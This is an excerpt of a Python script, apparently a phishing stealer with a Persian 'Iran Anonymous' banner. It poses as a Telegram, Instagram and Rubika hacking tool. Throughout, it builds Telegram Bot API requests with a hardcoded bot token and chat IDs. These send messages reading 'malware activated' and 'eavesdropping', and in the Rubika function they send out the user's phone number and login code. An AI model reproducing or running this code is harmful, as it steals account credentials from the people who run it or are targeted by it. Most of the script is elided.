...
url3 = 'https://api.telegram.org/bot5162186308:AAGksHVo_qv4ices2cNWn5ZroDruXA06_Rc/sendMessage?chat_id=1463885389=&text=' + 'بد افزار فعال شد'
...
# url
url = 'https://api.telegram.org/bot5162186308:AAGksHVo_qv4ices2cNWn5ZroDruXA06_Rc/sendMessage?chat_id=1463885389=&text=' + \
...
# snod
url3 = 'https://api.telegram.org/bot5162186308:AAGksHVo_qv4ices2cNWn5ZroDruXA06_Rc/sendMessage?chat_id=1463885389=&text=' + 'در حال شنود'
...
def insta():
    ...
    print(Fore.GREEN+'|    @rjjrjfi                                                                                                |')
    print(Fore.GREEN+'|     ایران انانیموس                                                                                    |')
    print(Fore.GREEN+'|                                                                                                                |')
    print(Fore.GREEN+'|      page instagram follow amir.tatalo.fan.11228                        |')
    print(Fore.GREEN+'|                                                                                                                |')
    print(Fore.GREEN+'|                                                                                                                |')
    print(Fore.GREEN+' ___________________________________________________________')

    url4 = 'https://api.telegram.org/bot5162186308:AAGksHVo_qv4ices2cNWn5ZroDruXA06_Rc/sendMessage?chat_id=1463885389=&text=' + \
    ...
    url1 = 'https://api.telegram.org/bot5162186308:AAGksHVo_qv4ices2cNWn5ZroDruXA06_Rc/sendMessage?chat_id=1463885389=&text=' + \
...
def telegram():
    ...
    print(Fore.LIGHTMAGENTA_EX +
          '|    channel telegram : @rjjrjfi                         |')
    print(Fore.LIGHTMAGENTA_EX +
          '|     ایران انانیموس                                  |')
    print(Fore.LIGHTMAGENTA_EX +
          '|                                                          |')
    print(Fore.LIGHTMAGENTA_EX +
          '|      page instagram follow amir.tatalo.fan.11228                     |')
    print(Fore.LIGHTMAGENTA_EX +
          '|                                                          |')
    print(Fore.LIGHTMAGENTA_EX +
          '|                                                          |')
    url5 = 'https://api.telegram.org/bot5162186308:AAGksHVo_qv4ices2cNWn5ZroDruXA06_Rc/sendMessage?chat_id=1463885389=&text=' + \
    ...
    url7 = 'https://api.telegram.org/bot5162186308:AAGksHVo_qv4ices2cNWn5ZroDruXA06_Rc/sendMessage?chat_id=2105752726=&text=' + \
    ...
    url6 = 'https://api.telegram.org/bot5162186308:AAGksHVo_qv4ices2cNWn5ZroDruXA06_Rc/sendMessage?chat_id=1463885389=&text=' + \
...
def rubika():
    ...
    print(Fore.MAGENTA +
          ' ___________________________________________________________')
    url10 = 'https://api.telegram.org/bot5162186308:AAGksHVo_qv4ices2cNWn5ZroDruXA06_Rc/sendMessage?chat_id=1463885389=&text=' + \
    ...
    url8 = 'https://api.telegram.org/bot5162186308:AAGksHVo_qv4ices2cNWn5ZroDruXA06_Rc/sendMessage?chat_id=1463885389=&text=' + \
    ...
    url9 = 'https://api.telegram.org/bot5162186308:AAGksHVo_qv4ices2cNWn5ZroDruXA06_Rc/sendMessage?chat_id=1463885389=&text=' + \
        'شماره موبایل :  '+rubika+'\n'+'کد ورودی :  '+code2
...
print(Fore.RED+'  +---------------------------------+')
print(Fore.GREEN+'  | is help script Enter [ help ]   |')
print(Fore.GREEN+'  | Enter for [1] and telegram run |')
print(Fore.GREEN+'  | Enter for [2] and instagram run|')
print(Fore.GREEN+'  | Enter for [3] and rubika run   |')
print(Fore.RED+'  |                                 |')
...
print(Fore.RED+'  | Telegram Channel:T.me/rjjrjfi |')
print(Fore.RED+'  |                                 |')
print(Fore.RED+'  +---------------------------------+')
